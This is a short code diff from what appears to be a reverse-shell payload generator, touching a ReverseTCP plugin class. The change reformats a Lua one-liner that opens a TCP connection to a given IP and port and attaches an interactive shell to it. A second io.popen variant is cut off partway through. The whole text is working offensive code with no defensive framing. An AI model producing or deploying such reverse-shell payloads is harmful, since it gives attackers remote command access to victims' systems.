@@ -23,8 +23,9 @@ class ReverseTCP(plugin.ReverseShell):
 
     def make_shell(self):
         if self.args.exec == "os.execute":
-            self.shell = f"""lua -e "require('socket');require('os');t=socket.tcp();t:connect('{self.args.ip}','{self.args.port}');os.execute('{self.args.shell} -i <&3 >&3 2>&3'); """
-            self.shell += '"'
+            self.shell = """lua -e "require('socket');require('os');t=socket.tcp();"""
+            self.shell += f"""t:connect('{self.args.ip}','{self.args.port}');"""
+            self.shell += f"""os.execute('{self.args.shell} -i <&3 >&3 2>&3'); \""""
         elif self.args.exec == "io.popen":
             self.shell = f"""lua -e 'local host, port = "{self.args.ip}", {self.args.port} local socket = require(
             "socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local 
